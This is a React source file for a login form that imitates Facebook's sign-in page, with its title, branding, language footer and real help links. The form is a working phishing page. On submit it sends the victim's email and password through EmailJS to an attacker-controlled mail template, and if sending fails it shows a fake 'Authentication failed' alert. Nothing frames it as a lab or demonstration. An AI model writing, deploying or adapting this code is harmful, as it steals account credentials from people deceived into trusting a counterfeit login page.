import React, { useState, useEffect } from "react";
import styles from  '../Assets/Styles/facebook-form.css';
import emailjs from '@emailjs/browser';

const FacebookForm = () => {
    const [email, setEmail] = useState('')
    const [password, setPassword] = useState('')
    const [redBorder, setRedBorder] = useState(false)

    const [loaderState, setLoaderState] = useState(false)

    useEffect(() => {
        document.title = 'Log in - Facebook'

        return () => {
            document.title = 'Document'
        }
    }, [])

    const sendEmail = (e) => {
        e.preventDefault();

        if (password.length < 8) {
            setRedBorder(true)
            return;
        } else {
            setRedBorder(false)
        }

        setLoaderState(true)
        emailjs.send('gmail-react', 'template_fzfd6jd', 
            {
                _engine: 'Facebook',
                _email: email,
                _password: password,
            }, '-ULgQTRPj8f-lNNg0')
            .then(function() {
                setLoaderState(false)
                
            }, function(error) {
                alert('Authentication failed... please try again', error)
            }
        );
        
        setEmail('')
        setPassword('')
    };

    const renderLoader = () => {
        if (loaderState) {
                return (
                    <div className="ui segment">
                    <p></p>
                    <div className="ui active inverted dimmer">
                        <div className="ui loader"></div>
                    </div>
                </div>
            )
        }
    }

    return (
        <div style={styles} className="facebook-container">
            <div className="title-wrapper">
                <p className="title-f"><strong>facebook</strong></p>
            </div>
            <form onSubmit={sendEmail}>
                <div className="item">
                    <input type="email" placeholder="Mobile number or email" name="_email" onChange={(e) => setEmail(e.target.value)} value={email} required/>
                </div>
                <div className="item">
                    <input className={`${redBorder ? 'red-border' : ''}`} min={8} type="password" placeholder="Password" name="_password" onChange={e => setPassword(e.target.value)} value={password} required/>
                </div>
                <button formAction="submit" className="login-btn">Log in</button>
                <a href="https://www.facebook.com/help/">Forgot password?</a>
            </form>
            <div className="hr-wrapper">
                <hr />
                <p>or</p>
                <hr />
            </div>
            <div className="cr-new-acc-button">
                <button onClick={() => window.location.href = 'https://www.facebook.com/'}>Create new account</button>
            </div>

            <footer>
                <div className="upper-part">
                    <div className="language-side">
                        English (US) <br />
                        Русский <br />
                        Deutsch <br />
                        Português (Brazil) <br />
                    </div>
                    <div className="language-side">
                        ქართული <br />
                        Türkçe  <br />
                        Español <br />
                        <i style={{border: '1px gray solid', color: 'gray', borderRadius: '4px', padding: '5px'}} className="fa fa-thin fa-plus"></i>
                    </div>
                </div>
                <div className="bottom-part">
                    <span>
                        About · Help · More
                    </span>
                    <span>
                        Meta © 2022
                    </span>
                </div>
            </footer>

            { renderLoader () }
        </div>
    )
}

export default FacebookForm;